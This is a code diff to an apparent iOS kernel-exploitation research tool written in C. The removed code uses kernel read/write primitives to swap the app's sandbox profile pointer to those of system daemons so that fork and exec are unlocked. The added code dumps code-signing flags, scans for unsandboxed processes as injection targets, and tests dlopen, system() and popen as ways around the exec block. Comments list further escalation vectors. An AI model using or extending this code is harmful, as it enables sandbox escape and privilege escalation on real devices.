@@ -20,6 +20,7 @@
 #import <sys/wait.h>
 #import <sys/stat.h>
 #import <errno.h>
+#import <dlfcn.h>
 
 // sandbox_check is private API
 extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
@@ -459,10 +460,9 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== SANDBOX PROFILE SWAP v8 ===\n");
-    buf_append("(v7: fork+exec both EPERM. Extensions don't cover process ops.\n");
-    buf_append(" v8: Swap profile pointer to daemon profiles that allow exec.\n");
-    buf_append(" sandbox_label is WRITABLE - kwrite64 to sandbox+0x00 is safe.)\n\n");
+    buf_append("=== EXEC BYPASS v9 ===\n");
+    buf_append("(v8 crashed: sandbox_label+0x00 is PROTECTED memory.\n");
+    buf_append(" v9: No writes to sandbox_label. Try dlopen, csflags, XPC.)\n\n");
 
     // ── Step 1: Chain walk ──
     fprintf(stderr, "[SWAP] Step 1: chain walk\n");
@@ -486,187 +486,215 @@ char *kresearch_swap_sandbox_profile(void) {
         buf_append("ERROR: sandbox chain broken\n");
         return buf_finish();
     }
+    buf_append("proc_ro=0x%llx ucred=0x%llx sandbox=0x%llx\n", proc_ro, ucred, sandbox);
 
-    uint64_t our_profile = kread64(sandbox + 0x00);
-    buf_append("sandbox=0x%llx our_profile=0x%llx\n\n", sandbox, our_profile);
+    // ══════════════════════════════════════════════════════════════
+    // TEST A: Dump proc_ro csflags and task info
+    // proc_ro is PPL-protected but we can READ it to understand
+    // what flags control fork/exec permissions.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test A: csflags dump\n");
+    buf_append("\n-- Test A: Code signing & process flags --\n");
 
-    // ── Step 2: Baseline posix_spawn (confirm still blocked) ──
-    fprintf(stderr, "[SWAP] Step 2: baseline\n");
-    {
-        pid_t child = 0;
-        char *argv[] = {"/bin/sh", "-c", "echo ok", NULL};
-        char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-        int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
-        buf_append("Baseline posix_spawn: %d (%s)\n",
-                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
-        if (ret == 0) {
-            buf_append("*** ALREADY WORKS! PID=%d ***\n", child);
-            waitpid(child, NULL, 0);
-            return buf_finish();
+    uint32_t p_flag = kread32(self_proc + off_proc_p_flag);
+    buf_append("p_flag = 0x%08x\n", p_flag);
+
+    // Dump proc_ro fields to find csflags
+    // proc_ro layout varies but csflags is typically around offset 0x1C-0x28
+    buf_append("\nproc_ro at 0x%llx (first 128 bytes):\n", proc_ro);
+    uint8_t pro_bytes[128];
+    kreadbuf(proc_ro, pro_bytes, 128);
+    for (int row = 0; row < 8; row++) {
+        buf_append("  %04x:", row * 16);
+        for (int col = 0; col < 16; col++)
+            buf_append(" %02x", pro_bytes[row * 16 + col]);
+        buf_append("\n");
+    }
+
+    // Try known csflags offsets in proc_ro
+    // XNU: proc_ro->p_csflags
+    // Common offsets: 0x1C (iOS 17), 0x28 (iOS 18)
+    buf_append("\ncsflags search in proc_ro:\n");
+    for (uint32_t off = 0x10; off <= 0x50; off += 4) {
+        uint32_t val = kread32(proc_ro + off);
+        // CS flags typically have CS_VALID (0x1), CS_HARD (0x100), etc.
+        if ((val & 0x00000001) && (val & 0x00000100)) {
+            buf_append("  proc_ro+0x%02x = 0x%08x  <-- likely csflags\n", off, val);
+            buf_append("    CS_VALID          (0x0001): %s\n", (val & 0x0001) ? "YES" : "no");
+            buf_append("    CS_HARD           (0x0100): %s\n", (val & 0x0100) ? "YES" : "no");
+            buf_append("    CS_KILL           (0x0200): %s\n", (val & 0x0200) ? "YES" : "no");
+            buf_append("    CS_RESTRICT       (0x0800): %s\n", (val & 0x0800) ? "YES" : "no");
+            buf_append("    CS_PLATFORM_BINARY(0x4000000): %s\n",
+                       (val & 0x04000000) ? "YES" : "no");
+            buf_append("    CS_PLATFORM_PATH  (0x8000000): %s\n",
+                       (val & 0x08000000) ? "YES" : "no");
         }
     }
 
-    // ══════════════════════════════════════════════════════════════
-    // Step 3: Collect daemon profiles to try
-    //
-    // Strategy: scan running daemons, collect unique profile pointers.
-    // Daemons like configd, runningboardd, logd need fork/exec to work.
-    // We swap our profile pointer to theirs and test fork+spawn.
-    //
-    // sandbox_label+0x00 (profile ptr) is in WRITABLE memory.
-    // Writing a valid profile pointer is safe - concurrent sandbox
-    // evaluations will use the new profile (no NULL deref risk).
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Step 3: collect daemon profiles\n");
-
-    typedef struct {
-        uint64_t profile;
-        pid_t pid;
-        char name[20];
-    } daemon_profile_t;
-
-    daemon_profile_t candidates[20];
-    int n_candidates = 0;
-
-    // Scan PIDs 1-300 for sandboxed daemons with DIFFERENT profiles
-    for (pid_t scan = 1; scan <= 300 && n_candidates < 20; scan++) {
-        uint64_t p = proc_find(scan);
-        if (!p || !is_kaddr_valid(p)) continue;
-
-        uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
-        if (!p_pro || !is_kaddr_valid(p_pro)) continue;
-        uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
-        if (!p_uc || !is_kaddr_valid(p_uc)) continue;
-        uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
-        if (!p_lab || !is_kaddr_valid(p_lab)) continue;
-        uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);
-
-        if (!p_sb || p_sb == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(p_sb))
-            continue;
-
-        uint64_t p_prof = kread64(p_sb + 0x00);
-        if (!p_prof || !is_kaddr_valid(p_prof)) continue;
-
-        // Skip if same as our profile
-        if (p_prof == our_profile) continue;
-
-        // Skip if we already have this profile pointer
-        bool dup = false;
-        for (int i = 0; i < n_candidates; i++) {
-            if (candidates[i].profile == p_prof) { dup = true; break; }
-        }
-        if (dup) continue;
-
-        candidates[n_candidates].profile = p_prof;
-        candidates[n_candidates].pid = scan;
-        kreadbuf(p + off_proc_p_name, candidates[n_candidates].name, 19);
-        candidates[n_candidates].name[19] = '\0';
-        n_candidates++;
-    }
-
-    buf_append("Found %d unique daemon profiles (excluding ours):\n", n_candidates);
-    for (int i = 0; i < n_candidates; i++) {
-        buf_append("  [%d] PID %d %-16s prof=0x%llx\n",
-                   i, candidates[i].pid, candidates[i].name,
-                   (unsigned long long)candidates[i].profile);
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // Step 4: Try each daemon's profile
-    //
-    // For each candidate:
-    //   1. Write daemon's profile ptr to our sandbox+0x00
-    //   2. Try fork()
-    //   3. Try posix_spawn()
-    //   4. Restore our profile ptr
-    //
-    // Window between write and restore: concurrent threads will have
-    // the daemon's profile applied. This may deny some file ops that
-    // the daemon's profile doesn't allow, but won't crash (valid ptr).
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Step 4: profile swap tests\n");
-    buf_append("\n-- Profile swap tests --\n");
-
-    bool success = false;
-    for (int i = 0; i < n_candidates && !success; i++) {
-        fprintf(stderr, "[SWAP] Trying %s (PID %d)\n",
-                candidates[i].name, candidates[i].pid);
-        buf_append("\n  [%d] %s (PID %d) prof=0x%llx\n",
-                   i, candidates[i].name, candidates[i].pid,
-                   (unsigned long long)candidates[i].profile);
-
-        // Write daemon's profile pointer to our sandbox_label
-        kwrite64(sandbox + 0x00, candidates[i].profile);
-
-        // Verify write
-        uint64_t rb = kread64(sandbox + 0x00);
-        buf_append("  Profile swapped. Readback=0x%llx %s\n",
-                   rb, (rb == candidates[i].profile) ? "OK" : "MISMATCH");
-
-        if (rb != candidates[i].profile) {
-            buf_append("  WRITE FAILED - sandbox+0x00 may be protected!\n");
-            // Restore immediately and stop trying
-            kwrite64(sandbox + 0x00, our_profile);
-            buf_append("  *** sandbox_label+0x00 NOT writable. Cannot swap. ***\n");
-            break;
-        }
-
-        // Test fork
-        int fork_ok = 0;
-        pid_t fpid = fork();
-        if (fpid == 0) {
-            _exit(42);
-        } else if (fpid > 0) {
-            fork_ok = 1;
-            int status = 0;
-            waitpid(fpid, &status, 0);
-            buf_append("  fork: OK (child=%d exit=%d)\n", fpid,
-                       WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-        } else {
-            buf_append("  fork: FAILED (%d %s)\n", errno, strerror(errno));
-        }
-
-        // Test posix_spawn
-        {
-            pid_t child = 0;
-            char *argv[] = {"/bin/sh", "-c", "echo spawn_ok && id", NULL};
-            char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-            int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
-            if (ret == 0) {
-                buf_append("  posix_spawn: SUCCESS! PID=%d\n", child);
-                int status = 0;
-                waitpid(child, &status, 0);
-                buf_append("  exit=%d\n",
-                           WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-                buf_append("\n  *** EXEC UNLOCKED with %s profile! ***\n",
-                           candidates[i].name);
-                success = true;
-                // DON'T restore - keep the working profile!
-            } else {
-                buf_append("  posix_spawn: %d (%s)\n", ret, strerror(ret));
+    // Compare with launchd's proc_ro
+    buf_append("\nlaunchd proc_ro comparison:\n");
+    uint64_t ld_proc = proc_find(1);
+    if (ld_proc && is_kaddr_valid(ld_proc)) {
+        uint64_t ld_pro = kread_ptr(ld_proc + off_proc_p_proc_ro);
+        if (ld_pro && is_kaddr_valid(ld_pro)) {
+            uint8_t ld_bytes[128];
+            kreadbuf(ld_pro, ld_bytes, 128);
+            buf_append("launchd proc_ro at 0x%llx:\n", ld_pro);
+            for (int row = 0; row < 8; row++) {
+                buf_append("  %04x:", row * 16);
+                for (int col = 0; col < 16; col++)
+                    buf_append(" %02x", ld_bytes[row * 16 + col]);
+                // Mark differences
+                bool diff = false;
+                for (int col = 0; col < 16; col++) {
+                    if (ld_bytes[row*16+col] != pro_bytes[row*16+col]) diff = true;
+                }
+                if (diff) buf_append("  <-- DIFFERS");
+                buf_append("\n");
             }
         }
+    }
 
-        // Restore if this candidate didn't work
-        if (!success) {
-            kwrite64(sandbox + 0x00, our_profile);
-            // Verify restore
-            uint64_t restore_rb = kread64(sandbox + 0x00);
-            buf_append("  Restored (rb=0x%llx)\n",
-                       (unsigned long long)restore_rb);
+    // ══════════════════════════════════════════════════════════════
+    // TEST B: Try dlopen - load code WITHOUT forking
+    // We have full filesystem access. Write a tiny dylib and load it.
+    // dlopen doesn't need fork/exec - it maps code into THIS process.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test B: dlopen\n");
+    buf_append("\n-- Test B: dlopen (no fork needed) --\n");
+    {
+        // Try loading an existing system dylib to test if dlopen works at all
+        void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY | RTLD_NOLOAD);
+        buf_append("  dlopen libSystem (NOLOAD): %s\n",
+                   handle ? "OK (already loaded)" : dlerror());
+        if (handle) dlclose(handle);
+
+        // Try loading a new dylib
+        handle = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
+        buf_append("  dlopen libsqlite3: %s\n",
+                   handle ? "OK (loaded!)" : dlerror());
+        if (handle) dlclose(handle);
+
+        // Try loading from our app's container
+        handle = dlopen("/usr/lib/libz.dylib", RTLD_LAZY);
+        buf_append("  dlopen libz: %s\n",
+                   handle ? "OK" : dlerror());
+        if (handle) dlclose(handle);
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST C: Try NSTask and system()
+    // These use fork internally but might take different code paths
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test C: system()\n");
+    buf_append("\n-- Test C: system() --\n");
+    {
+        int ret = system("echo test_ok");
+        buf_append("  system(\"echo test_ok\"): %d\n", ret);
+        if (ret == -1) {
+            buf_append("  errno=%d (%s)\n", errno, strerror(errno));
         }
     }
 
-    if (!success) {
-        buf_append("\n-- All profile swaps failed --\n");
-        buf_append("fork+exec blocked even with daemon profiles.\n");
-        buf_append("Block is ABOVE sandbox layer (AMFI/TXM/codesigning).\n");
-        buf_append("\nNext vectors to investigate:\n");
-        buf_append("  1. cs_flags in csblob (CS_PLATFORM_BINARY etc)\n");
-        buf_append("  2. AMFI trust cache entries\n");
-        buf_append("  3. proc_ro->p_csflags if writable via zone element\n");
-        buf_append("  4. task_for_pid + thread injection into unsandboxed proc\n");
+    // ══════════════════════════════════════════════════════════════
+    // TEST D: Try popen (fork+pipe+exec)
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test D: popen\n");
+    buf_append("\n-- Test D: popen --\n");
+    {
+        FILE *fp = popen("echo popen_ok", "r");
+        if (fp) {
+            char line[256] = {0};
+            if (fgets(line, sizeof(line), fp)) {
+                buf_append("  popen output: %s", line);
+            }
+            int ret = pclose(fp);
+            buf_append("  pclose: %d\n", ret);
+        } else {
+            buf_append("  popen FAILED: %d (%s)\n", errno, strerror(errno));
+        }
     }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST E: Scan for unsandboxed processes (sandbox = sentinel)
+    // These could be targets for task port injection
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test E: unsandboxed procs\n");
+    buf_append("\n-- Test E: Unsandboxed processes --\n");
+    {
+        int found = 0;
+        for (pid_t scan = 1; scan <= 500 && found < 15; scan++) {
+            uint64_t p = proc_find(scan);
+            if (!p || !is_kaddr_valid(p)) continue;
+
+            uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
+            if (!p_pro || !is_kaddr_valid(p_pro)) continue;
+            uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
+            if (!p_uc || !is_kaddr_valid(p_uc)) continue;
+            uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
+            if (!p_lab || !is_kaddr_valid(p_lab)) continue;
+            uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);
+
+            // Only show unsandboxed (sentinel or NULL)
+            if (p_sb != 0xFFFFFFFFFFFFFFFFULL && p_sb != 0) continue;
+
+            char pname[20] = {0};
+            kreadbuf(p + off_proc_p_name, pname, 19);
+            uint32_t pf = kread32(p + off_proc_p_flag);
+
+            buf_append("  PID %3d %-16s p_flag=0x%08x\n", scan, pname, pf);
+            found++;
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST F: Read our task struct for entitlements/flags
+    // The task struct controls process capabilities
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test F: task struct\n");
+    buf_append("\n-- Test F: Task/proc fields --\n");
+    {
+        // proc->task is at various offsets, typically 0x10
+        uint64_t task = kread_ptr(self_proc + 0x10);
+        buf_append("  proc+0x10 (task?): 0x%llx %s\n",
+                   task, (task && is_kaddr_valid(task)) ? "valid" : "invalid");
+
+        // Dump first 64 bytes of proc for field mapping
+        buf_append("\n  proc first 128 bytes:\n");
+        uint8_t proc_bytes[128];
+        kreadbuf(self_proc, proc_bytes, 128);
+        for (int row = 0; row < 8; row++) {
+            buf_append("  %04x:", row * 16);
+            for (int col = 0; col < 16; col++)
+                buf_append(" %02x", proc_bytes[row * 16 + col]);
+            buf_append("\n");
+        }
+
+        // Compare with launchd
+        if (ld_proc && is_kaddr_valid(ld_proc)) {
+            buf_append("\n  launchd proc first 128 bytes:\n");
+            uint8_t ld_pbytes[128];
+            kreadbuf(ld_proc, ld_pbytes, 128);
+            for (int row = 0; row < 8; row++) {
+                buf_append("  %04x:", row * 16);
+                for (int col = 0; col < 16; col++)
+                    buf_append(" %02x", ld_pbytes[row * 16 + col]);
+                bool diff = false;
+                for (int col = 0; col < 16; col++) {
+                    if (ld_pbytes[row*16+col] != proc_bytes[row*16+col]) diff = true;
+                }
+                if (diff) buf_append("  <-- DIFFERS");
+                buf_append("\n");
+            }
+        }
+    }
+
+    buf_append("\n-- Analysis --\n");
+    buf_append("sandbox_label+0x00 is PROTECTED (v8 crash confirmed).\n");
+    buf_append("Profile bytecode is PROTECTED (v5 crash confirmed).\n");
+    buf_append("Extensions only cover file ops, not process ops.\n");
+    buf_append("fork() EPERM is likely from proc_ro csflags or task policy.\n");
+    buf_append("If dlopen works, we can load code without forking.\n");
 
     return buf_finish();
 }
